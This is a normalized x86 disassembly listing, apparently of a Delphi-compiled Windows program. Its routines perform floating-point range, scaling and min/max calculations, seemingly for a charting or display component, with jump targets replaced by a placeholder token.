lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_477be4
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
call sub_472f94
imul [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_47dfd8
pop ecx
mov [ ebp - 0x1c ] edi
mov eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
cmp [ ebp - 0x1c ] 0xffffffff
je r-xdata
mov [ ebp - 0x20 ] eax
adc eax 0x0
fild [ ebp - 0x24 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fild [ eax + 0x50 ]
fmulp st1
call sub_402b0c
add [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov [ ebp - 0x24 ] eax
cmp edi [ ebp - 0x1c ]
jl r-xdata
adc eax 0x0
mov eax [ ebp - 0x24 ]
add eax edi
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x20 ]
cmp eax edx
setle al
mov eax edi
sub eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x20 ]
cmp eax edx
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_47dfd8
pop ecx
mov [ ebp - 0x1c ] edi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
test al al
je r-xdata
sub_47e588
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_47e667
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push [ eax - 0x1c ]
push [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47d158
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0xd4 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_47dfbc
pop ecx
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0xd8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax - 0x1c ]
push [ eax - 0x20 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47c050
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_47dfd8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e66e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
push [ eax - 0x24 ]
push [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_47b348
sub_47e674
push ebp
mov ebp esp
mov ecx eax
cdq
fld1
xor eax edx
sub eax edx
je r-xdata
fwait
pop ebp
retn 0xc
fld [ ebp + 0x8 ]
jmp r-xdata
shr eax 0x1
jae r-xdata
fmul st0
fmul st1
jne r-xdata
fstp st0
cmp ecx 0x0
jge r-xdata
fld1
fdivrp st1
sub_47e6bc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ ebp + 0x8 ]
add esi 0xffffffe0
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx ]
fld [ eax + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebx ]
fild [ eax + 0x24 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebx ]
fild [ eax + 0x24 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebx ]
fld [ eax + 0xb8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
call sub_47e6a4
call sub_402b00
call sub_47e674
fstp [ esi ]
fwait
jmp r-xdata
mov eax [ ebx ]
fld [ eax + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0xb8 ] 0xd9d7bdbb
mov [ eax + 0xbc ] 0x3ddb7cdf
mov eax [ ebx ]
mov [ eax + 0xb8 ] 0x9999999a
mov [ eax + 0xbc ] 0x3fb99999
jmp r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ ebx ]
mov edx [ eax + 0xb8 ]
mov [ esi ] edx
mov edx [ eax + 0xbc ]
mov [ esi + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
fild [ eax + 0x24 ]
fmul [ esi ]
fstp [ esi ]
fwait
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_47e588
pop ecx
sub_47e7c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ ebp + 0x8 ]
add esi 0xffffffe0
mov eax [ ebx ]
fld [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
fdiv [ eax - 0x28 ]
fstp [ esi ]
fwait
mov eax [ ebx ]
fld [ eax + 0xc0 ]
mov eax [ ebp + 0x8 ]
fdiv [ eax - 0x28 ]
fabs
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0xb0 ]
mov [ esi ] edx
mov edx [ eax + 0xb4 ]
mov [ esi + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x69 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x19
je r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
fld [ esi ]
call sub_402b0c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x28 ]
fstp [ esi ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0xe
jb r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x24 ]
push [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov ecx esi
mov eax [ ebx ]
xor edx edx
call sub_47b348
fld [ r-xdata ]
mov eax [ ebx ]
fsubr [ eax + 0xb8 ]
fld [ r-xdata ]
fdivp st1
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebx ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
call sub_4789b4
fstp [ esi ]
fwait
jmp r-xdata
fld [ esi ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x1
call sub_47e588
pop ecx
sub_47e91c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_47e7c8
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_47e6bc
pop ecx
pop ebp
retn
sub_47e95c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0xb8 ]
mov [ eax - 0x20 ] ecx
mov ecx [ edx + 0xbc ]
mov [ eax - 0x1c ] ecx
mov [ ebp - 0x1 ] 0x1
xor esi esi
xor ebx ebx
fld [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fsubr [ eax + 0xb8 ]
mov eax [ ebp + 0x8 ]
fcomp [ eax - 0x20 ]
fnstsw ax
sahf
ja r-xdata
test esi esi
jne r-xdata
xor ebx ebx
jmp r-xdata
fld [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fadd [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
fcomp [ eax - 0x20 ]
fnstsw ax
sahf
jae r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_47e91c
pop ecx
jmp r-xdata
test bl bl
je r-xdata
mov bl 0x1
inc esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_47e588
pop ecx
cmp esi 0x7d0
jg r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov ecx esi
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_47ea40
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov ebx [ eax + 0x90 ]
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov edx [ ebx + 0x70 ]
call sub_41d9c8
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41dae4
mov eax [ esi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x38 ]
mov eax [ esi ]
mov ecx [ ebx + 0x29a ]
call sub_47cadc
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0xcc ]
mov eax [ esi ]
mov edx [ eax + 0x38 ]
mov eax [ esi ]
call sub_47cadc
mov eax [ esi ]
mov ecx [ eax + 0x38 ]
mov eax [ esi ]
mov edx [ eax + 0xcc ]
mov eax [ esi ]
call sub_47cadc
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_47eae0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47ec08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x2e8 ]
call sub_483500
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ec0f
lea eax [ ebp - 0x8 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb8 ]
call sub_402b0c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb0 ]
call sub_402b0c
mov esi eax
sub esi ebx
jl r-xdata
inc esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_47dfbc
pop ecx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x90 ]
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_483e14
cmp [ edi + 0x30a ] 0x0
je r-xdata
mov [ ebp - 0xc ] ebx
fild [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fsubr [ eax + 0xb0 ]
fsub [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47d00c
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47dfd8
pop ecx
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
xor ecx ecx
mov eax [ edi + 0x30c ]
call [ edi + 0x308 ]
sub_47ec1c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_47ee10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
mov esi [ eax + 0x90 ]
mov eax [ edi ]
call sub_47b384
mov edx [ edi ]
mov [ edx + 0xc8 ] al
mov eax [ edi ]
mov edx [ eax + 0x48 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ edi ]
call sub_47bc30
fstp [ ebp - 0x28 ]
fwait
test bl bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x30 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
lea edx [ esi + 0x28e ]
mov eax [ edi ]
call sub_47d4e0
mov edx eax
lea ecx [ esi + 0x28e ]
mov eax [ edi ]
call sub_47d464
mov edx [ edi ]
mov [ edx + 0x2c ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
push ebp
call sub_47ea40
pop ecx
mov [ ebp - 0x29 ] 0x19
mov eax [ edi ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ edi ]
fld [ eax + 0xb0 ]
mov eax [ edi ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
cmp [ ebp - 0x29 ] 0x12
jb r-xdata
mov eax [ edi ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push ebp
call sub_47df0c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47edf4
push 0x0
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c4
add esp 0x4
retn
mov eax [ edi ]
call sub_47c144
mov [ ebp - 0x11 ] al
mov al [ ebp - 0x11 ]
sub al 0x2
je r-xdata
cmp [ ebp - 0x29 ] 0x18
ja r-xdata
mov eax [ edi ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_47726c
mov [ ebp - 0x29 ] al
cmp [ ebp - 0x29 ] 0x19
je r-xdata
cmp [ esi + 0x312 ] 0x0
je r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x7d0
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c4
add esp 0x4
xor eax eax
push ebp
push sub_47eded
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp - 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
jmp r-xdata
push ebp
call sub_47e91c
pop ecx
jmp r-xdata
push ebp
call sub_47e95c
pop ecx
jmp r-xdata
push ebp
call sub_47e348
pop ecx
jmp r-xdata
dec al
je r-xdata
fld [ ebp - 0x28 ]
xor eax eax
mov al [ ebp - 0x29 ]
mov edx [ rw-data ]
fcomp [ edx + eax * 8 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ edi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x29 ] 0x18
jne r-xdata
push ebp
call sub_47e348
pop ecx
push ebp
call sub_47eae0
pop ecx
jmp r-xdata
inc [ ebp - 0x29 ]
jmp r-xdata
sub_47ee24
push ebx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
xor eax eax
call sub_41d7e4
jmp r-xdata
mov edx [ ebx + 0x78 ]
cmp [ edx + 0x21 ] 0x0
je r-xdata
add eax [ ebx + 0x88 ]
mov edx [ ebx + 0x7c ]
cmp [ edx + 0x21 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x74 ]
call sub_476954
sub_47ee88
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi + 0x90 ]
mov eax [ edi + 0x288 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xdc ]
cmp [ esi + 0x8e ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x5a
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
call sub_472f94
jmp r-xdata
sub eax 0xb4
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_472f94
jmp r-xdata
sub eax 0xb3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
call sub_47c41c
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
mov eax esi
call sub_47c41c
jmp r-xdata
sub_47ef40
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8f ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8f ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx ] eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub [ edx + 0xc ] eax
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx + 0x4 ] eax
jmp r-xdata
pop ebp
retn
sub_47ef9c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
sub eax edx
add eax edx
jmp r-xdata
add eax edx
pop ebp
retn
sub eax edx
jmp r-xdata
pop ebp
retn
sub_47efdc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edx
call sub_47ef40
pop ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47d4e0
pop ebp
retn
sub_47effc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
mov eax [ edi ]
call sub_47b384
mov edx [ edi ]
mov [ edx + 0xc8 ] al
test bl bl
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_47d4e0
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_47d464
mov ebx eax
mov eax [ edi ]
mov [ eax + 0x2c ] ebx
push ebp
mov eax [ edi ]
call sub_47ee24
mov edx eax
mov eax ebx
call sub_47ef9c
pop ecx
mov esi eax
mov eax [ edi ]
mov [ eax + 0x5c ] esi
push ebp
mov eax [ edi ]
call sub_47ee74
mov edx eax
mov eax esi
call sub_47ef9c
pop ecx
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov eax [ edi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ edi ]
mov ebx [ eax + 0x30 ]
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ edi ]
mov [ edx + 0x38 ] eax
jmp r-xdata
mov eax [ edi ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push ebp
mov eax [ edi ]
call sub_47ee5c
call sub_47efdc
pop ecx
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov eax [ edi ]
call sub_47ee24
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x90 ]
mov edx [ edi ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add ebx eax
test ebx ebx
jle r-xdata
push ebp
mov eax [ edi ]
call sub_47ee74
call sub_47efdc
pop ecx
mov edx [ edi ]
mov [ edx + 0x5c ] eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x38 ]
mov eax [ edi ]
call sub_47d464
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax [ edi ]
call sub_47d464
mov edx [ edi ]
mov [ edx + 0x5c ] eax
jmp r-xdata
push ebp
mov eax ebx
call sub_47ef40
pop ecx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f120
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov edx [ edx + 0x24 ]
mov [ eax + 0x24 ] edx
retn
sub_47f154
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
push esi
mov ecx [ ebx + 0x24 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
call sub_412f2c
pop esi
pop ebx
retn
sub_47f170
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x54 ] 0x1
xor eax eax
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] 0x3ff00000
mov eax esi
mov [ edi + 0x30 ] eax
mov eax [ eax + 0x80 ]
mov edx edi
call sub_414210
lea eax [ edi + 0x28 ]
mov edx [ ebp + 0x8 ]
call sub_4040e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ edi + 0x8 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47f1f4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47f22c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
dec edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_47f250
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
mov edx 0x8
call sub_402714
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41425c
mov [ ebx + 0x54 ] 0x1
pop esi
pop ebx
retn
sub_47f27c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026f4
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414438
mov [ ebx + 0x54 ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
sub_47f2b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax 0x8
call sub_4026f4
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ edi ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0xffffffff
je r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_414210
mov esi eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_414210
mov esi eax
jmp r-xdata
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
mov [ ebx + 0x54 ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x2c ] 0x2
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
test esi esi
jl r-xdata
jmp r-xdata
inc esi
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414438
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
test esi esi
jl r-xdata
dec esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
ja r-xdata
dec esi
jmp r-xdata
sub_47f38c
push ebp
mov ebp esp
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x20 ]
fnstsw ax
sahf
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x54 ] 0x1
xor ecx ecx
mov dl 0x3
mov eax [ ebx + 0x30 ]
call sub_483268
mov eax [ ebx + 0x30 ]
call sub_481450
sub_47f3c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
fld [ eax ]
fmul [ ebx + 0x20 ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_47f3ec
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4143bc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ ebx + 0x54 ] 0x1
mov ecx esi
mov dl 0x4
mov eax [ ebx + 0x30 ]
call sub_483268
pop esi
pop ebx
pop ebp
retn 0x8
sub_47f420
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ esp ] eax
